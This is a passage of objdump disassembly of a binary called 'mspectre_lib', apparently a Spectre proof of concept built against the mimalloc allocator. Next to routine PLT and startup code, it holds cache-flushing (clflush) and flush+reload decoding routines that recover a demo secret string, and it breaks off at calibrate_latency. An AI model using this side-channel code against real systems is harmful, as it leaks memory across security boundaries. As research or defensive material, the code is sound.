
mspectre_lib:     file format elf64-x86-64


Disassembly of section .init:

0000000000400d68 <_init>:
  400d68:	f3 0f 1e fa          	endbr64 
  400d6c:	48 83 ec 08          	sub    $0x8,%rsp
  400d70:	48 8b 05 49 42 22 00 	mov    0x224249(%rip),%rax        # 624fc0 <__gmon_start__@Base>
  400d77:	48 85 c0             	test   %rax,%rax
  400d7a:	74 02                	je     400d7e <_init+0x16>
  400d7c:	ff d0                	callq  *%rax
  400d7e:	48 83 c4 08          	add    $0x8,%rsp
  400d82:	c3                   	retq   

Disassembly of section .plt:

0000000000400d90 <.plt>:
  400d90:	ff 35 72 42 22 00    	pushq  0x224272(%rip)        # 625008 <_GLOBAL_OFFSET_TABLE_+0x8>
  400d96:	ff 25 74 42 22 00    	jmpq   *0x224274(%rip)        # 625010 <_GLOBAL_OFFSET_TABLE_+0x10>
  400d9c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400da0 <getenv@plt>:
  400da0:	ff 25 72 42 22 00    	jmpq   *0x224272(%rip)        # 625018 <getenv@GLIBC_2.2.5>
  400da6:	68 00 00 00 00       	pushq  $0x0
  400dab:	e9 e0 ff ff ff       	jmpq   400d90 <.plt>

0000000000400db0 <abort@plt>:
  400db0:	ff 25 6a 42 22 00    	jmpq   *0x22426a(%rip)        # 625020 <abort@GLIBC_2.2.5>
  400db6:	68 01 00 00 00       	pushq  $0x1
  400dbb:	e9 d0 ff ff ff       	jmpq   400d90 <.plt>

0000000000400dc0 <__errno_location@plt>:
  400dc0:	ff 25 62 42 22 00    	jmpq   *0x224262(%rip)        # 625028 <__errno_location@GLIBC_2.2.5>
  400dc6:	68 02 00 00 00       	pushq  $0x2
  400dcb:	e9 c0 ff ff ff       	jmpq   400d90 <.plt>

0000000000400dd0 <puts@plt>:
  400dd0:	ff 25 5a 42 22 00    	jmpq   *0x22425a(%rip)        # 625030 <puts@GLIBC_2.2.5>
  400dd6:	68 03 00 00 00       	pushq  $0x3
  400ddb:	e9 b0 ff ff ff       	jmpq   400d90 <.plt>

0000000000400de0 <clock_gettime@plt>:
  400de0:	ff 25 52 42 22 00    	jmpq   *0x224252(%rip)        # 625038 <clock_gettime@GLIBC_2.17>
  400de6:	68 04 00 00 00       	pushq  $0x4
  400deb:	e9 a0 ff ff ff       	jmpq   400d90 <.plt>

0000000000400df0 <strlen@plt>:
  400df0:	ff 25 4a 42 22 00    	jmpq   *0x22424a(%rip)        # 625040 <strlen@GLIBC_2.2.5>
  400df6:	68 05 00 00 00       	pushq  $0x5
  400dfb:	e9 90 ff ff ff       	jmpq   400d90 <.plt>

0000000000400e00 <mmap@plt>:
  400e00:	ff 25 42 42 22 00    	jmpq   *0x224242(%rip)        # 625048 <mmap@GLIBC_2.2.5>
  400e06:	68 06 00 00 00       	pushq  $0x6
  400e0b:	e9 80 ff ff ff       	jmpq   400d90 <.plt>

0000000000400e10 <printf@plt>:
  400e10:	ff 25 3a 42 22 00    	jmpq   *0x22423a(%rip)        # 625050 <printf@GLIBC_2.2.5>
  400e16:	68 07 00 00 00       	pushq  $0x7
  400e1b:	e9 70 ff ff ff       	jmpq   400d90 <.plt>

0000000000400e20 <pthread_setspecific@plt>:
  400e20:	ff 25 32 42 22 00    	jmpq   *0x224232(%rip)        # 625058 <pthread_setspecific@GLIBC_2.2.5>
  400e26:	68 08 00 00 00       	pushq  $0x8
  400e2b:	e9 60 ff ff ff       	jmpq   400d90 <.plt>

0000000000400e30 <pthread_mutex_destroy@plt>:
  400e30:	ff 25 2a 42 22 00    	jmpq   *0x22422a(%rip)        # 625060 <pthread_mutex_destroy@GLIBC_2.2.5>
  400e36:	68 09 00 00 00       	pushq  $0x9
  400e3b:	e9 50 ff ff ff       	jmpq   400d90 <.plt>

0000000000400e40 <__assert_fail@plt>:
  400e40:	ff 25 22 42 22 00    	jmpq   *0x224222(%rip)        # 625068 <__assert_fail@GLIBC_2.2.5>
  400e46:	68 0a 00 00 00       	pushq  $0xa
  400e4b:	e9 40 ff ff ff       	jmpq   400d90 <.plt>

0000000000400e50 <fputs@plt>:
  400e50:	ff 25 1a 42 22 00    	jmpq   *0x22421a(%rip)        # 625070 <fputs@GLIBC_2.2.5>
  400e56:	68 0b 00 00 00       	pushq  $0xb
  400e5b:	e9 30 ff ff ff       	jmpq   400d90 <.plt>

0000000000400e60 <memset@plt>:
  400e60:	ff 25 12 42 22 00    	jmpq   *0x224212(%rip)        # 625078 <memset@GLIBC_2.2.5>
  400e66:	68 0c 00 00 00       	pushq  $0xc
  400e6b:	e9 20 ff ff ff       	jmpq   400d90 <.plt>

0000000000400e70 <syscall@plt>:
  400e70:	ff 25 0a 42 22 00    	jmpq   *0x22420a(%rip)        # 625080 <syscall@GLIBC_2.2.5>
  400e76:	68 0d 00 00 00       	pushq  $0xd
  400e7b:	e9 10 ff ff ff       	jmpq   400d90 <.plt>

0000000000400e80 <strtol@plt>:
  400e80:	ff 25 02 42 22 00    	jmpq   *0x224202(%rip)        # 625088 <strtol@GLIBC_2.2.5>
  400e86:	68 0e 00 00 00       	pushq  $0xe
  400e8b:	e9 00 ff ff ff       	jmpq   400d90 <.plt>

0000000000400e90 <realpath@plt>:
  400e90:	ff 25 fa 41 22 00    	jmpq   *0x2241fa(%rip)        # 625090 <realpath@GLIBC_2.3>
  400e96:	68 0f 00 00 00       	pushq  $0xf
  400e9b:	e9 f0 fe ff ff       	jmpq   400d90 <.plt>

0000000000400ea0 <memcpy@plt>:
  400ea0:	ff 25 f2 41 22 00    	jmpq   *0x2241f2(%rip)        # 625098 <memcpy@GLIBC_2.14>
  400ea6:	68 10 00 00 00       	pushq  $0x10
  400eab:	e9 e0 fe ff ff       	jmpq   400d90 <.plt>

0000000000400eb0 <prctl@plt>:
  400eb0:	ff 25 ea 41 22 00    	jmpq   *0x2241ea(%rip)        # 6250a0 <prctl@GLIBC_2.2.5>
  400eb6:	68 11 00 00 00       	pushq  $0x11
  400ebb:	e9 d0 fe ff ff       	jmpq   400d90 <.plt>

0000000000400ec0 <pthread_mutex_unlock@plt>:
  400ec0:	ff 25 e2 41 22 00    	jmpq   *0x2241e2(%rip)        # 6250a8 <pthread_mutex_unlock@GLIBC_2.2.5>
  400ec6:	68 12 00 00 00       	pushq  $0x12
  400ecb:	e9 c0 fe ff ff       	jmpq   400d90 <.plt>

0000000000400ed0 <munmap@plt>:
  400ed0:	ff 25 da 41 22 00    	jmpq   *0x2241da(%rip)        # 6250b0 <munmap@GLIBC_2.2.5>
  400ed6:	68 13 00 00 00       	pushq  $0x13
  400edb:	e9 b0 fe ff ff       	jmpq   400d90 <.plt>

0000000000400ee0 <pthread_key_create@plt>:
  400ee0:	ff 25 d2 41 22 00    	jmpq   *0x2241d2(%rip)        # 6250b8 <pthread_key_create@GLIBC_2.2.5>
  400ee6:	68 14 00 00 00       	pushq  $0x14
  400eeb:	e9 a0 fe ff ff       	jmpq   400d90 <.plt>

0000000000400ef0 <madvise@plt>:
  400ef0:	ff 25 ca 41 22 00    	jmpq   *0x2241ca(%rip)        # 6250c0 <madvise@GLIBC_2.2.5>
  400ef6:	68 15 00 00 00       	pushq  $0x15
  400efb:	e9 90 fe ff ff       	jmpq   400d90 <.plt>

0000000000400f00 <mprotect@plt>:
  400f00:	ff 25 c2 41 22 00    	jmpq   *0x2241c2(%rip)        # 6250c8 <mprotect@GLIBC_2.2.5>
  400f06:	68 16 00 00 00       	pushq  $0x16
  400f0b:	e9 80 fe ff ff       	jmpq   400d90 <.plt>

0000000000400f10 <getrusage@plt>:
  400f10:	ff 25 ba 41 22 00    	jmpq   *0x2241ba(%rip)        # 6250d0 <getrusage@GLIBC_2.2.5>
  400f16:	68 17 00 00 00       	pushq  $0x17
  400f1b:	e9 70 fe ff ff       	jmpq   400d90 <.plt>

0000000000400f20 <perror@plt>:
  400f20:	ff 25 b2 41 22 00    	jmpq   *0x2241b2(%rip)        # 6250d8 <perror@GLIBC_2.2.5>
  400f26:	68 18 00 00 00       	pushq  $0x18
  400f2b:	e9 60 fe ff ff       	jmpq   400d90 <.plt>

0000000000400f30 <sysconf@plt>:
  400f30:	ff 25 aa 41 22 00    	jmpq   *0x2241aa(%rip)        # 6250e0 <sysconf@GLIBC_2.2.5>
  400f36:	68 19 00 00 00       	pushq  $0x19
  400f3b:	e9 50 fe ff ff       	jmpq   400d90 <.plt>

0000000000400f40 <pthread_key_delete@plt>:
  400f40:	ff 25 a2 41 22 00    	jmpq   *0x2241a2(%rip)        # 6250e8 <pthread_key_delete@GLIBC_2.2.5>
  400f46:	68 1a 00 00 00       	pushq  $0x1a
  400f4b:	e9 40 fe ff ff       	jmpq   400d90 <.plt>

0000000000400f50 <pthread_mutex_init@plt>:
  400f50:	ff 25 9a 41 22 00    	jmpq   *0x22419a(%rip)        # 6250f0 <pthread_mutex_init@GLIBC_2.2.5>
  400f56:	68 1b 00 00 00       	pushq  $0x1b
  400f5b:	e9 30 fe ff ff       	jmpq   400d90 <.plt>

0000000000400f60 <strstr@plt>:
  400f60:	ff 25 92 41 22 00    	jmpq   *0x224192(%rip)        # 6250f8 <strstr@GLIBC_2.2.5>
  400f66:	68 1c 00 00 00       	pushq  $0x1c
  400f6b:	e9 20 fe ff ff       	jmpq   400d90 <.plt>

0000000000400f70 <pthread_mutex_lock@plt>:
  400f70:	ff 25 8a 41 22 00    	jmpq   *0x22418a(%rip)        # 625100 <pthread_mutex_lock@GLIBC_2.2.5>
  400f76:	68 1d 00 00 00       	pushq  $0x1d
  400f7b:	e9 10 fe ff ff       	jmpq   400d90 <.plt>

0000000000400f80 <pthread_mutex_trylock@plt>:
  400f80:	ff 25 82 41 22 00    	jmpq   *0x224182(%rip)        # 625108 <pthread_mutex_trylock@GLIBC_2.2.5>
  400f86:	68 1e 00 00 00       	pushq  $0x1e
  400f8b:	e9 00 fe ff ff       	jmpq   400d90 <.plt>

0000000000400f90 <__ctype_b_loc@plt>:
  400f90:	ff 25 7a 41 22 00    	jmpq   *0x22417a(%rip)        # 625110 <__ctype_b_loc@GLIBC_2.3>
  400f96:	68 1f 00 00 00       	pushq  $0x1f
  400f9b:	e9 f0 fd ff ff       	jmpq   400d90 <.plt>

Disassembly of section .text:

0000000000400fa0 <mi_heap_try_new.cold.22>:
  400fa0:	e8 0b fe ff ff       	callq  400db0 <abort@plt>

0000000000400fa5 <mi_segments_page_alloc.cold.18>:
  400fa5:	50                   	push   %rax
  400fa6:	48 8b 04 25 08 00 00 	mov    0x8,%rax
  400fad:	00 
  400fae:	48 8b 14 25 10 00 00 	mov    0x10,%rdx
  400fb5:	00 
  400fb6:	52                   	push   %rdx
  400fb7:	50                   	push   %rax
  400fb8:	48 8b 04 25 00 00 00 	mov    0x0,%rax
  400fbf:	00 
  400fc0:	50                   	push   %rax
  400fc1:	8b 7c 24 58          	mov    0x58(%rsp),%edi
  400fc5:	e8 86 7a 01 00       	callq  418a50 <_mi_arena_memid_is_suitable>
  400fca:	0f 0b                	ud2    

0000000000400fcc <.annobin_elf_init.c.unlikely>:
  400fcc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400fd0 <mi_process_detach>:
  400fd0:	e9 bb 67 00 00       	jmpq   407790 <_mi_auto_process_done>

0000000000400fd5 <.annobin_elf_init.c.exit>:
  400fd5:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  400fdc:	00 00 00 
  400fdf:	90                   	nop

0000000000400fe0 <mi_process_attach>:
  400fe0:	e9 9b 64 00 00       	jmpq   407480 <_mi_auto_process_init>

0000000000400fe5 <.annobin_elf_init.c.hot>:
  400fe5:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  400fec:	00 00 00 
  400fef:	90                   	nop

0000000000400ff0 <_start>:
  400ff0:	f3 0f 1e fa          	endbr64 
  400ff4:	31 ed                	xor    %ebp,%ebp
  400ff6:	49 89 d1             	mov    %rdx,%r9
  400ff9:	5e                   	pop    %rsi
  400ffa:	48 89 e2             	mov    %rsp,%rdx
  400ffd:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
  401001:	50                   	push   %rax
  401002:	54                   	push   %rsp
  401003:	49 c7 c0 d0 b7 41 00 	mov    $0x41b7d0,%r8
  40100a:	48 c7 c1 60 b7 41 00 	mov    $0x41b760,%rcx
  401011:	48 c7 c7 d3 1a 40 00 	mov    $0x401ad3,%rdi
  401018:	ff 15 9a 3f 22 00    	callq  *0x223f9a(%rip)        # 624fb8 <__libc_start_main@GLIBC_2.2.5>
  40101e:	f4                   	hlt    

000000000040101f <.annobin_init.c>:
  40101f:	90                   	nop

0000000000401020 <_dl_relocate_static_pie>:
  401020:	f3 0f 1e fa          	endbr64 
  401024:	c3                   	retq   

0000000000401025 <.annobin__dl_relocate_static_pie.end>:
  401025:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40102c:	00 00 00 
  40102f:	90                   	nop

0000000000401030 <deregister_tm_clones>:
  401030:	48 8d 3d 49 77 22 00 	lea    0x227749(%rip),%rdi        # 628780 <__TMC_END__>
  401037:	48 8d 05 42 77 22 00 	lea    0x227742(%rip),%rax        # 628780 <__TMC_END__>
  40103e:	48 39 f8             	cmp    %rdi,%rax
  401041:	74 15                	je     401058 <deregister_tm_clones+0x28>
  401043:	48 8b 05 5e 3f 22 00 	mov    0x223f5e(%rip),%rax        # 624fa8 <_ITM_deregisterTMCloneTable@Base>
  40104a:	48 85 c0             	test   %rax,%rax
  40104d:	74 09                	je     401058 <deregister_tm_clones+0x28>
  40104f:	ff e0                	jmpq   *%rax
  401051:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401058:	c3                   	retq   
  401059:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000401060 <register_tm_clones>:
  401060:	48 8d 3d 19 77 22 00 	lea    0x227719(%rip),%rdi        # 628780 <__TMC_END__>
  401067:	48 8d 35 12 77 22 00 	lea    0x227712(%rip),%rsi        # 628780 <__TMC_END__>
  40106e:	48 29 fe             	sub    %rdi,%rsi
  401071:	48 c1 fe 03          	sar    $0x3,%rsi
  401075:	48 89 f0             	mov    %rsi,%rax
  401078:	48 c1 e8 3f          	shr    $0x3f,%rax
  40107c:	48 01 c6             	add    %rax,%rsi
  40107f:	48 d1 fe             	sar    %rsi
  401082:	74 14                	je     401098 <register_tm_clones+0x38>
  401084:	48 8b 05 45 3f 22 00 	mov    0x223f45(%rip),%rax        # 624fd0 <_ITM_registerTMCloneTable@Base>
  40108b:	48 85 c0             	test   %rax,%rax
  40108e:	74 08                	je     401098 <register_tm_clones+0x38>
  401090:	ff e0                	jmpq   *%rax
  401092:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401098:	c3                   	retq   
  401099:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

00000000004010a0 <__do_global_dtors_aux>:
  4010a0:	f3 0f 1e fa          	endbr64 
  4010a4:	80 3d d5 76 22 00 00 	cmpb   $0x0,0x2276d5(%rip)        # 628780 <__TMC_END__>
  4010ab:	75 13                	jne    4010c0 <__do_global_dtors_aux+0x20>
  4010ad:	55                   	push   %rbp
  4010ae:	48 89 e5             	mov    %rsp,%rbp
  4010b1:	e8 7a ff ff ff       	callq  401030 <deregister_tm_clones>
  4010b6:	c6 05 c3 76 22 00 01 	movb   $0x1,0x2276c3(%rip)        # 628780 <__TMC_END__>
  4010bd:	5d                   	pop    %rbp
  4010be:	c3                   	retq   
  4010bf:	90                   	nop
  4010c0:	c3                   	retq   
  4010c1:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  4010c8:	00 00 00 00 
  4010cc:	0f 1f 40 00          	nopl   0x0(%rax)

00000000004010d0 <frame_dummy>:
  4010d0:	f3 0f 1e fa          	endbr64 
  4010d4:	eb 8a                	jmp    401060 <register_tm_clones>

00000000004010d6 <array_index_mask_nospec>:
  4010d6:	55                   	push   %rbp
  4010d7:	48 89 e5             	mov    %rsp,%rbp
  4010da:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  4010de:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
  4010e2:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4010e6:	48 3b 45 e0          	cmp    -0x20(%rbp),%rax
  4010ea:	48 19 c0             	sbb    %rax,%rax
  4010ed:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4010f1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4010f5:	5d                   	pop    %rbp
  4010f6:	c3                   	retq   

00000000004010f7 <secret_init>:
  4010f7:	55                   	push   %rbp
  4010f8:	48 89 e5             	mov    %rsp,%rbp
  4010fb:	48 83 ec 10          	sub    $0x10,%rsp
  4010ff:	bf 20 00 00 00       	mov    $0x20,%edi
  401104:	e8 c7 12 00 00       	callq  4023d0 <mi_malloc>
  401109:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  40110d:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
  401112:	75 11                	jne    401125 <secret_init+0x2e>
  401114:	bf 10 b8 41 00       	mov    $0x41b810,%edi
  401119:	e8 02 fe ff ff       	callq  400f20 <perror@plt>
  40111e:	b8 00 00 00 00       	mov    $0x0,%eax
  401123:	eb 2d                	jmp    401152 <secret_init+0x5b>
  401125:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401129:	48 ba 54 68 65 20 63 	movabs $0x656b616320656854,%rdx
  401130:	61 6b 65 
  401133:	48 b9 20 69 73 20 61 	movabs $0x696c206120736920,%rcx
  40113a:	20 6c 69 
  40113d:	48 89 10             	mov    %rdx,(%rax)
  401140:	48 89 48 08          	mov    %rcx,0x8(%rax)
  401144:	66 c7 40 10 65 21    	movw   $0x2165,0x10(%rax)
  40114a:	c6 40 12 00          	movb   $0x0,0x12(%rax)
  40114e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401152:	c9                   	leaveq 
  401153:	c3                   	retq   

0000000000401154 <array_init>:
  401154:	55                   	push   %rbp
  401155:	48 89 e5             	mov    %rsp,%rbp
  401158:	48 83 ec 10          	sub    $0x10,%rsp
  40115c:	8b 05 e2 3f 22 00    	mov    0x223fe2(%rip),%eax        # 625144 <array_size>
  401162:	89 c0                	mov    %eax,%eax
  401164:	48 89 c7             	mov    %rax,%rdi
  401167:	e8 64 12 00 00       	callq  4023d0 <mi_malloc>
  40116c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  401170:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
  401175:	75 11                	jne    401188 <array_init+0x34>
  401177:	bf 10 b8 41 00       	mov    $0x41b810,%edi
  40117c:	e8 9f fd ff ff       	callq  400f20 <perror@plt>
  401181:	b8 00 00 00 00       	mov    $0x0,%eax
  401186:	eb 1d                	jmp    4011a5 <array_init+0x51>
  401188:	8b 05 b6 3f 22 00    	mov    0x223fb6(%rip),%eax        # 625144 <array_size>
  40118e:	89 c2                	mov    %eax,%edx
  401190:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401194:	be 2d 00 00 00       	mov    $0x2d,%esi
  401199:	48 89 c7             	mov    %rax,%rdi
  40119c:	e8 bf fc ff ff       	callq  400e60 <memset@plt>
  4011a1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4011a5:	c9                   	leaveq 
  4011a6:	c3                   	retq   

00000000004011a7 <otherArray_init>:
  4011a7:	55                   	push   %rbp
  4011a8:	48 89 e5             	mov    %rsp,%rbp
  4011ab:	89 7d ec             	mov    %edi,-0x14(%rbp)
  4011ae:	89 75 e8             	mov    %esi,-0x18(%rbp)
  4011b1:	89 d0                	mov    %edx,%eax
  4011b3:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
  4011b7:	88 45 e4             	mov    %al,-0x1c(%rbp)
  4011ba:	8b 45 ec             	mov    -0x14(%rbp),%eax
  4011bd:	8b 55 e8             	mov    -0x18(%rbp),%edx
  4011c0:	83 ea 01             	sub    $0x1,%edx
  4011c3:	89 d2                	mov    %edx,%edx
  4011c5:	48 01 c2             	add    %rax,%rdx
  4011c8:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4011cc:	48 01 d0             	add    %rdx,%rax
  4011cf:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4011d3:	0f b6 55 e4          	movzbl -0x1c(%rbp),%edx
  4011d7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4011db:	88 10                	mov    %dl,(%rax)
  4011dd:	90                   	nop
  4011de:	5d                   	pop    %rbp
  4011df:	c3                   	retq   

00000000004011e0 <random_char>:
  4011e0:	55                   	push   %rbp
  4011e1:	48 89 e5             	mov    %rsp,%rbp
  4011e4:	0f b6 05 5d 3f 22 00 	movzbl 0x223f5d(%rip),%eax        # 625148 <prev_char>
  4011eb:	0f be c0             	movsbl %al,%eax
  4011ee:	8d 48 01             	lea    0x1(%rax),%ecx
  4011f1:	ba c1 02 0b 2c       	mov    $0x2c0b02c1,%edx
  4011f6:	89 c8                	mov    %ecx,%eax
  4011f8:	f7 ea                	imul   %edx
  4011fa:	c1 fa 04             	sar    $0x4,%edx
  4011fd:	89 c8                	mov    %ecx,%eax
  4011ff:	c1 f8 1f             	sar    $0x1f,%eax
  401202:	29 c2                	sub    %eax,%edx
  401204:	89 d0                	mov    %edx,%eax
  401206:	6b c0 5d             	imul   $0x5d,%eax,%eax
  401209:	29 c1                	sub    %eax,%ecx
  40120b:	89 c8                	mov    %ecx,%eax
  40120d:	88 05 35 3f 22 00    	mov    %al,0x223f35(%rip)        # 625148 <prev_char>
  401213:	0f b6 05 2e 3f 22 00 	movzbl 0x223f2e(%rip),%eax        # 625148 <prev_char>
  40121a:	5d                   	pop    %rbp
  40121b:	c3                   	retq   

000000000040121c <csel>:
  40121c:	55                   	push   %rbp
  40121d:	48 89 e5             	mov    %rsp,%rbp
  401220:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  401224:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
  401228:	89 d0                	mov    %edx,%eax
  40122a:	88 45 dc             	mov    %al,-0x24(%rbp)
  40122d:	0f b6 45 dc          	movzbl -0x24(%rbp),%eax
  401231:	0f b6 c0             	movzbl %al,%eax
  401234:	48 f7 d8             	neg    %rax
  401237:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  40123b:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  40123f:	48 23 45 f8          	and    -0x8(%rbp),%rax
  401243:	48 89 c2             	mov    %rax,%rdx
  401246:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40124a:	48 f7 d0             	not    %rax
  40124d:	48 23 45 e0          	and    -0x20(%rbp),%rax
  401251:	48 09 d0             	or     %rdx,%rax
  401254:	5d                   	pop    %rbp
  401255:	c3                   	retq   

0000000000401256 <flush_lines>:
  401256:	55                   	push   %rbp
  401257:	48 89 e5             	mov    %rsp,%rbp
  40125a:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  40125e:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
  401262:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
  401266:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
  40126d:	00 
  40126e:	eb 23                	jmp    401293 <flush_lines+0x3d>
  401270:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  401274:	48 0f af 45 f8       	imul   -0x8(%rbp),%rax
  401279:	48 89 c2             	mov    %rax,%rdx
  40127c:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  401280:	48 01 d0             	add    %rdx,%rax
  401283:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  401287:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  40128b:	0f ae 38             	clflush (%rax)
  40128e:	48 83 45 f8 01       	addq   $0x1,-0x8(%rbp)
  401293:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401297:	48 3b 45 d8          	cmp    -0x28(%rbp),%rax
  40129b:	72 d3                	jb     401270 <flush_lines+0x1a>
  40129d:	90                   	nop
  40129e:	5d                   	pop    %rbp
  40129f:	c3                   	retq   

00000000004012a0 <decode_flush_reload_state>:
  4012a0:	55                   	push   %rbp
  4012a1:	48 89 e5             	mov    %rsp,%rbp
  4012a4:	48 83 ec 50          	sub    $0x50,%rsp
  4012a8:	48 89 7d c8          	mov    %rdi,-0x38(%rbp)
  4012ac:	48 89 75 c0          	mov    %rsi,-0x40(%rbp)
  4012b0:	48 89 55 b8          	mov    %rdx,-0x48(%rbp)
  4012b4:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
  4012bb:	00 
  4012bc:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
  4012c3:	00 
  4012c4:	c6 45 ef 00          	movb   $0x0,-0x11(%rbp)
  4012c8:	c6 45 ee 00          	movb   $0x0,-0x12(%rbp)
  4012cc:	48 c7 45 e0 01 00 00 	movq   $0x1,-0x20(%rbp)
  4012d3:	00 
  4012d4:	eb 51                	jmp    401327 <decode_flush_reload_state+0x87>
  4012d6:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  4012da:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
  4012e1:	00 
  4012e2:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  4012e6:	48 01 d0             	add    %rdx,%rax
  4012e9:	48 8b 00             	mov    (%rax),%rax
  4012ec:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
  4012f0:	73 30                	jae    401322 <decode_flush_reload_state+0x82>
  4012f2:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4012f6:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  4012fa:	0f b6 45 ef          	movzbl -0x11(%rbp),%eax
  4012fe:	88 45 ee             	mov    %al,-0x12(%rbp)
  401301:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  401305:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
  40130c:	00 
  40130d:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  401311:	48 01 d0             	add    %rdx,%rax
  401314:	48 8b 00             	mov    (%rax),%rax
  401317:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  40131b:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  40131f:	88 45 ef             	mov    %al,-0x11(%rbp)
  401322:	48 83 45 e0 01       	addq   $0x1,-0x20(%rbp)
  401327:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  40132b:	48 3b 45 b8          	cmp    -0x48(%rbp),%rax
  40132f:	73 0a                	jae    40133b <decode_flush_reload_state+0x9b>
  401331:	48 81 7d e0 ff 00 00 	cmpq   $0xff,-0x20(%rbp)
  401338:	00 
  401339:	76 9b                	jbe    4012d6 <decode_flush_reload_state+0x36>
  40133b:	e8 50 fc ff ff       	callq  400f90 <__ctype_b_loc@plt>
  401340:	48 8b 00             	mov    (%rax),%rax
  401343:	0f b6 55 ef          	movzbl -0x11(%rbp),%edx
  401347:	48 01 d2             	add    %rdx,%rdx
  40134a:	48 01 d0             	add    %rdx,%rax
  40134d:	0f b7 00             	movzwl (%rax),%eax
  401350:	0f b7 c0             	movzwl %ax,%eax
  401353:	25 00 40 00 00       	and    $0x4000,%eax
  401358:	85 c0                	test   %eax,%eax
  40135a:	74 06                	je     401362 <decode_flush_reload_state+0xc2>
  40135c:	0f b6 45 ef          	movzbl -0x11(%rbp),%eax
  401360:	eb 05                	jmp    401367 <decode_flush_reload_state+0xc7>
  401362:	b8 3f 00 00 00       	mov    $0x3f,%eax
  401367:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
  40136b:	88 02                	mov    %al,(%rdx)
  40136d:	e8 1e fc ff ff       	callq  400f90 <__ctype_b_loc@plt>
  401372:	48 8b 00             	mov    (%rax),%rax
  401375:	0f b6 55 ee          	movzbl -0x12(%rbp),%edx
  401379:	48 01 d2             	add    %rdx,%rdx
  40137c:	48 01 d0             	add    %rdx,%rax
  40137f:	0f b7 00             	movzwl (%rax),%eax
  401382:	0f b7 c0             	movzwl %ax,%eax
  401385:	25 00 40 00 00       	and    $0x4000,%eax
  40138a:	85 c0                	test   %eax,%eax
  40138c:	74 06                	je     401394 <decode_flush_reload_state+0xf4>
  40138e:	0f b6 45 ee          	movzbl -0x12(%rbp),%eax
  401392:	eb 05                	jmp    401399 <decode_flush_reload_state+0xf9>
  401394:	b8 3f 00 00 00       	mov    $0x3f,%eax
  401399:	88 45 df             	mov    %al,-0x21(%rbp)
  40139c:	0f b6 7d ee          	movzbl -0x12(%rbp),%edi
  4013a0:	0f be 75 df          	movsbl -0x21(%rbp),%esi
  4013a4:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4013a8:	0f b6 00             	movzbl (%rax),%eax
  4013ab:	0f be d0             	movsbl %al,%edx
  4013ae:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4013b2:	0f b6 00             	movzbl (%rax),%eax
  4013b5:	0f be c0             	movsbl %al,%eax
  4013b8:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
  4013bc:	48 83 ec 08          	sub    $0x8,%rsp
  4013c0:	ff 75 f0             	pushq  -0x10(%rbp)
  4013c3:	41 89 f9             	mov    %edi,%r9d
  4013c6:	41 89 f0             	mov    %esi,%r8d
  4013c9:	89 c6                	mov    %eax,%esi
  4013cb:	bf 28 b8 41 00       	mov    $0x41b828,%edi
  4013d0:	b8 00 00 00 00       	mov    $0x0,%eax
  4013d5:	e8 36 fa ff ff       	callq  400e10 <printf@plt>
  4013da:	48 83 c4 10          	add    $0x10,%rsp
  4013de:	90                   	nop
  4013df:	c9                   	leaveq 
  4013e0:	c3                   	retq   

00000000004013e1 <calibrate_latency>:
